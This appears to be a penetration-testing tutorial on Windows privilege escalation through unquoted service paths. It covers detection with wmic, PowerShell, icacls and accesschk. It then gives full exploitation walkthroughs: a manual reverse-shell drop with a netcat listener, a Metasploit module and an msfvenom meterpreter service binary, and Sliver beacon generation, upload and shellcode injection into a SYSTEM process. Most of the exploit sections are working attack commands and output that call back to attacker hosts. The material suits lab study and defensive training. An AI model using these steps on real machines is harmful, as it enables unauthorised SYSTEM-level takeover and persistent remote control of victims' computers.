# Unquoted Service Paths

Unquoted service path that is a binary path doesn't contain the quotes (") to treats it as an absolute path which can make the service to be mislead to a malicious binary process when it's possible to override the service.

## 01 - Manual

### 1.1 - Detect

#### 1.1.1 - Command Prompt

```
C:\> wmic service get name,startname,pathname,startmode | findstr /i localsystem | findstr /i /v "c:\windows" | findstr /i /v """
AWSLiteAgent                              C:\Program Files\Amazon\XenTools\LiteAgent.exe                                     Auto       LocalSystem                  
unquotedsvc                               C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe        Manual     LocalSystem                  
winexesvc                                 winexesvc.exe                                                                      Manual     LocalSystem
```

As I have previously explained from the [[Insecure Service Permission|Insecure Service Paths]] section after the discovering the services. There isn't much to say to further confirm it that contains the previous to further verify it's vulnerable but to the **Unquoted Service Path** and the realistic scenario it might not be accessible to the **Users** group to `start` or `stop` the service via `sc.exe` or `net.exe` if it does not have the **BUILTIN\\Users:(I)(RX)** permissions except that it might have either **full access (BUILTIN\\Users:(F) or BUILTIN\\Users:(I)(F))** or **write access** **(BUILTIN\\Users:(W) or BUILTIN\\Users:(I)(W))**.

This is what it looks like to grant write access for the **Users** group with the following command:

```
C:\> icacls "C:\Program Files\Service name\service.exe" /grant "BUILTIN\Users":W
processed file: C:\Program Files\Service name\service.exe
Succesfully processed 1 files; Failed processing 0 files
```

So what you should look out is that the **Unquoted Service Path** that it is configured to **Auto** start the service that the computer needed to be rebooted as I explained on the previous privilege escalation technique.

```
C:\> sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

After running the `icacls` command the surprising thing of what it stands out that we have full access permission that displays with **BUILTIN\\Users:(F)** meaning the attacker can copy the malware and insert into that particular folder to execute it.

```
C:\> icacls "C:\Program Files\Unquoted Path Service"
C:\Program Files\Unquoted Path Service BUILTIN\Users:(F)
                                       NT SERVICE\TrustedInstaller:(I)(F)
                                       NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                       NT AUTHORITY\SYSTEM:(I)(F)
                                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Administrators:(I)(F)
                                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Users:(I)(RX)
                                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                       APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                       APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
                                       APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
                                       APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

#### 1.1.2 - Powershell

```
PS C:\> Get-WMIObject -ClassName Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

PS C:\> Get-CimInstance -ClassName Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | Select-Object PathName,DisplayName,Name
```

```
PS C:\> get-service unquotedsvc | format-list


Name                : unquotedsvc
DisplayName         : Unquoted Path Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32OwnProcess
```

When running the powershell cmdlet we have `BUILTIN\Users Allow FullControl` indicates that the users have full access in other words the attacker can copy the malware and insert into that particular folder to execute it

```
PS C:\> get-acl "C:\Program Files\Unquoted Path Service" | fl


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Unquoted Path Service
Owner  : BUILTIN\Administrators
Group  : WIN-QBA94KB3IOF\None
Access : BUILTIN\Users Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  : 
Sddl   : O:BAG:S-1-5-21-3025105784-3259396213-1915610826-513D:AI(A;;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-3418522649-18
         31038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(
         A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(
         A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-
         1-15-2-2)
```

```
PS C:\> $acl = get-acl "C:\Program Files\Unquoted Path Service"
PS C:\> convertfrom-sddlstring -sddl $acl.sddl | foreach-object {$_.DiscretionaryAcl}
BUILTIN\Users: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
NT SERVICE\TrustedInstaller: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
NT AUTHORITY\SYSTEM: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Users: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
```

Of course in order to verify even further to use it as future reference. When running with accesschk.exe we can see **RW BUILTIN\\Users** group that contains two letters and they are **R for read** and **W for write**. It is confirmed we can hijack this **Unquoted Service Path** without including the quotes and it will lead right back to our reverse shell with a suitable in order for this service to recognize it.

```
C:\> accesschk.exe -accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

### 1.2 - Exploit

Let's copy our reverse shell directly to the folder. You may notice that I've typed it without the capitals. During the MS DOS era, Windows operating systems can read the letters case insensitive. Also if you look closely about the reverse that was copied and renamed as `common.exe` that is because it is "unquoted" service the service will not execute the absolute path `C:\Program Files\Unquoted Path Service\Common Files\`. This will make Windows to accept the bogus program and run it anyways.

`$ sudo nc -lnvp 53`

- In command prompt

```
C:\> copy shell.exe "c:\program files\unquoted path service\common.exe"

C:\> sc stop unquotedsvc

C:\> sc start unquotedsvc
```

- In powershell

```
PS C:\> copy-item shell.exe "c:\program files\unquoted path service\common.exe"

PS C:\> Stop-Service unquotedsvc

PS C:\> Start-Service unquotedsvc
```

```
$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.186.48.
Ncat: Connection from 10.10.186.48:49859.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### 1.3 - Cleanup

Let's remove our reverse shell after we are done with the post exploitation phase.

`C:\Windows\system32> del "c:\program files\unquoted path service\common.exe"`

## 02 - Metasploit

### 2.1 - Usage

```
msf > use exploit/windows/local/unquoted_service_path

msf exploit(windows/local/unquoted_service_path) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/unquoted_service_path) > options 

Module options (exploit/windows/local/unquoted_service_path):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.100.35   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf exploit(windows/local/unquoted_service_path) > set lhost <IP>

msf exploit(windows/local/unquoted_service_path) > set lport <PORT>

msf exploit(windows/local/unquoted_service_path) > set quick <true | false>

msf exploit(windows/local/unquoted_service_path) > set session <session_id>

msf exploit(windows/local/unquoted_service_path) > run
```

### 2.2 - Detect

```
meterpreter > shell
Process 3448 created.
Channel 5 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user>wmic service get name,startname,pathname | findstr /i "localsystem" | findstr /i "C:\program files"
..[snip]..
unquotedsvc                          C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe                LocalSystem
..[snip]..

C:\Users\user>exit
exit
meterpreter > load extapi
Loading extension extapi...Success.
meterpreter > service_query unquotedsvc

Name        : unquotedsvc
Display     : Unquoted Path Service
Account     : LocalSystem
Status      : Stopped
Start Type  : Manual
Path        : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
L.O. Group  : 
Interactive : No
DACL        : D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;WD)

meterpreter > execute -Hicf icacls -a "\"C:\Program Files\Unquoted Path Service\""
Process 3592 created.
Channel 14 created.
C:\Program Files\Unquoted Path Service BUILTIN\Users:(F)
                                       NT SERVICE\TrustedInstaller:(I)(F)
                                       NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                       NT AUTHORITY\SYSTEM:(I)(F)
                                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Administrators:(I)(F)
                                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Users:(I)(RX)
                                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

### 2.3 - Exploit

```
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/script/web_delivery) > use exploit/windows/local/unquoted_service_path
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/unquoted_service_path) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/unquoted_service_path) > options

Module options (exploit/windows/local/unquoted_service_path):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   QUICK    true             no        Stop at first vulnerable service found
   SESSION                   yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/local/unquoted_service_path) > set lhost 10.8.145.108
lhost => 10.8.145.108
msf6 exploit(windows/local/unquoted_service_path) > set lport 53
lport => 53
msf6 exploit(windows/local/unquoted_service_path) > set session 1
session => 1
msf6 exploit(windows/local/unquoted_service_path) > exploit

[*] Started reverse TCP handler on 10.8.145.108:53
[*] Finding a vulnerable service...
[*] Attempting exploitation of AWSLiteAgent
[*] Exploit completed, but no session was created.
```

Well that was a disappointment looks like we'll have to do the manual way which is much better sometimes

`$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.8.145.108 lport=53 -f exe-service -o common.exe`

```
msf6 exploit(windows/local/unquoted_service_path) > handler -p windows/x64/meterpreter/reverse_tcp -H 10.8.145.108 -P 53 -x
[*] Payload handler running as background job 2.

[*] Started reverse TCP handler on 10.8.145.108:53
msf6 exploit(windows/local/unquoted_service_path) > sessions -1
[*] Starting interaction with 1...

meterpreter > upload common.exe "C:\Program Files\Unquoted Path Service"
[*] uploading  : /home/user/common.exe -> C:\Program Files\Unquoted Path Service
[*] uploaded   : /home/user/common.exe -> C:\Program Files\Unquoted Path Service\common.exe
meterpreter > service_control unquotedsvc restart
[+] Operation restart succeeded.
[*] Sending stage (200774 bytes) to 10.10.229.49
[*] Meterpreter session 3 opened (10.8.145.108:53 -> 10.10.229.49:49302) at 2022-05-29 16:21:38 -0400

meterpreter > sessions 3
[*] Backgrounding session 1...
[*] Starting interaction with 3...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 2.4 - Cleanup

`meterpreter > rm "C:\Program Files\Unquoted Path Service\common.exe"`

## 03 - Sliver

### 3.1 - Detect

```
sliver (OTHER_GLOCKENSPIEL) > whoami

Logon ID: TCM-PC\user
[*] Tasked beacon OTHER_GLOCKENSPIEL (1d9fb5cd)

sliver (OTHER_GLOCKENSPIEL) > sharpup audit UnquotedServicePath

[*] Tasked beacon OTHER_GLOCKENSPIEL (25809ae1)

[+] OTHER_GLOCKENSPIEL completed task 25809ae1

[*] sharpup output:

=== SharpUp: Running Privilege Escalation Checks ===

=== Services with Unquoted Paths ===
        Service 'unquotedsvc' (StartMode: Manual) has executable 'C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe', but 'C:\Program Files\Unquoted Path Service\Common' is modifable.



[*] Completed Privesc Checks in 0 seconds
```

### 3.2 - Exploit

```
sliver (OTHER_GLOCKENSPIEL) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -f service

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[*] Implant saved to /home/user/BEWILDERED_ALDER.exe

sliver (OTHER_GLOCKENSPIEL) > upload BEWILDERED_ALDER.exe 'C:\\program files\\unquoted path service\\common.exe'

[*] Tasked beacon OTHER_GLOCKENSPIEL (aea08c3d)

[+] OTHER_GLOCKENSPIEL completed task aea08c3d

[*] Wrote file to C:\program files\unquoted path service\common.exe

sliver (OTHER_GLOCKENSPIEL) > execute sc start unquotedsvc

[*] Tasked beacon OTHER_GLOCKENSPIEL (3569c8ef)

[+] OTHER_GLOCKENSPIEL completed task 3569c8ef

[*] Command executed successfully

[*] Beacon 83f89bab BEWILDERED_ALDER - 10.10.207.66:49884 (TCM-PC) - windows/amd64 - Thu, 24 Nov 2022 08:45:36 EST

sliver (OTHER_GLOCKENSPIEL) > background

[*] Background ...
```

Terminate previous beacons

```
sliver > beacons rm

? Select a beacon: 07ac6680-0b28-4f88-b0c0-c6961eb21364  OTHER_GLOCKENSPIEL  10.10.207.66:49711  TCM-PC  TCM-PC\user          windows/amd64
[*] Beacon removed (07ac6680-0b28-4f88-b0c0-c6961eb21364)

sliver > beacons rm

? Select a beacon: 83f89bab-84ca-4c7c-91e6-52827e86dfad  BEWILDERED_ALDER   10.10.207.66:49884  TCM-PC  NT AUTHORITY\SYSTEM  windows/amd64
[*] Beacon removed (83f89bab-84ca-4c7c-91e6-52827e86dfad)

sliver > use 83f89bab-84ca-4c7c-91e6-52827e86dfad

[*] Active beacon BEWILDERED_ALDER (83f89bab-84ca-4c7c-91e6-52827e86dfad)

sliver (BEWILDERED_ALDER) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Tasked beacon BEWILDERED_ALDER (e711480c)

[*] BEWILDERED_ALDER completed task e711480c
```

### 3.3 - Cleanup

```
sliver (BEWILDERED_ALDER) > ps

[*] Tasked beacon BEWILDERED_ALDER (0950167f)

[+] BEWILDERED_ALDER completed task 0950167f

 Pid    Ppid   Owner                          Arch     Executable               Session
====== ====== ============================== ======== ======================== =========
 0      0                                              [System Process]
 4      0                                     x86_64   System
 404    4      NT AUTHORITY\SYSTEM            x86_64   smss.exe
 540    532    NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 588    532    NT AUTHORITY\SYSTEM            x86_64   wininit.exe
 596    580    NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 624    580    NT AUTHORITY\SYSTEM            x86_64   winlogon.exe
 684    588    NT AUTHORITY\SYSTEM            x86_64   services.exe
 692    588    NT AUTHORITY\SYSTEM            x86_64   lsass.exe
 704    588    NT AUTHORITY\SYSTEM            x86_64   lsm.exe
 788    684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 852    684    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 936    624    NT AUTHORITY\SYSTEM            x86_64   LogonUI.exe
 952    684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1004   684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 384    684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 544    684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1092   684    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 1224   684    NT AUTHORITY\SYSTEM            x86_64   spoolsv.exe
 1252   684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1364   684    NT AUTHORITY\SYSTEM            x86_64   amazon-ssm-agent.exe
 1476   684    NT AUTHORITY\SYSTEM            x86_64   LiteAgent.exe
 1504   684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1652   684    NT AUTHORITY\SYSTEM            x86_64   Ec2Config.exe
 1952   684    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 1972   684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 1064   788    NT AUTHORITY\NETWORK SERVICE   x86_64   WmiPrvSE.exe
 2588   684    NT AUTHORITY\SYSTEM            x86_64   TrustedInstaller.exe
 2820   2812   NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 2844   2812   NT AUTHORITY\SYSTEM            x86_64   winlogon.exe
 2132   684    TCM-PC\user                    x86_64   taskhost.exe
 2428   1092   TCM-PC\user                    x86_64   rdpclip.exe
 2616   1004   TCM-PC\user                    x86_64   dwm.exe
 2640   2476   TCM-PC\user                    x86_64   explorer.exe
 2008   684    NT AUTHORITY\SYSTEM            x86_64   SearchIndexer.exe
 2004   684    NT AUTHORITY\NETWORK SERVICE   x86_64   sppsvc.exe
 1460   684    NT AUTHORITY\NETWORK SERVICE   x86_64   wmpnetwk.exe
 4028   2572   TCM-PC\user                    x86_64   powershell.exe
 1384   2820   TCM-PC\user                    x86_64   conhost.exe
 3716   944    TCM-PC\user                    x86_64   OTHER_GLOCKENSPIEL.exe
 1824   684    NT AUTHORITY\SYSTEM            x86_64   common.exe

sliver (BEWILDERED_ALDER) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -G -f shellcode

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[!] Shikata ga nai encoder is disabled
[*] Implant saved to /home/user/VICTORIOUS_POWDER.bin

sliver (BEWILDERED_ALDER) > execute-shellcode -p 2588 VICTORIOUS_POWDER.bin

[*] Tasked beacon BEWILDERED_ALDER (8f0005a2)

[+] BEWILDERED_ALDER completed task 8f0005a2

[*] Executed shellcode on target

[*] Beacon b9f30555 VICTORIOUS_POWDER - 10.10.207.66:50034 (TCM-PC) - windows/amd64 - Thu, 24 Nov 2022 08:51:18 EST

sliver (BEWILDERED_ALDER) > use b9f30555-40a8-440a-80be-ed526fa89394

[*] Active beacon VICTORIOUS_POWDER (b9f30555-40a8-440a-80be-ed526fa89394)
```

Switch to interactive mode

```
sliver (VICTORIOUS_POWDER) > interactive

[*] Using beacon's active C2 endpoint: mtls://10.9.19.98:8888
[*] Tasked beacon VICTORIOUS_POWDER (9dbd2dc4)

[*] Session fc6ddcab VICTORIOUS_POWDER - 10.10.207.66:50049 (TCM-PC) - windows/amd64 - Thu, 24 Nov 2022 08:51:41 EST

sliver (VICTORIOUS_POWDER) > sessions -i f

[*] Active session VICTORIOUS_POWDER (fc6ddcab)

sliver (VICTORIOUS_POWDER) > terminate 3716

[*] Process 3716 has been terminated

sliver (VICTORIOUS_POWDER) > rm 'C:\\program files\\unquoted path service\\common.exe'

[*] C:\program files\unquoted path service\common.exe
```

## References

- [Privilege Escalation Unquoted Service Paths](https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths)

- [Windows Privilege Escalation Part 1 Unquoted Service Path](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)